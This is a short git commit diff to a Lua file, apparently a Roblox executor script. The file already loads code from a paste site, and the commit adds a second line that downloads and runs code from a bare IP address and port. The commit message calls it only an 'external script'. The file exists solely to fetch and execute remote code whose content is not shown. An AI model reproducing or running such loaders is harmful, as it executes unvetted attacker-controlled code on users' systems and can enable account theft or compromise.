83d68df87bad359fa4485e7af639245d78cbe8ea
Breaad <ayoliam11@gmail.com>
2026-03-08 10:59:38 +0800

    Add additional loadstring call for external script

--- script.lua
+++ script.lua
@@ -1,1 +1,2 @@
 loadstring(game:HttpGet("https://pastefy.app/bmQpye1F/raw"))()
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjAwMWJiMzY2LWRjODAtNDMwNy04ZjU4LTU0OWEzZTU0NTU4OCIsImtpbmQiOiJtZWRpYSIsInZpc3VhbCI6eyJpZCI6InVuaXZlcnNhbCJ9fQ"))()
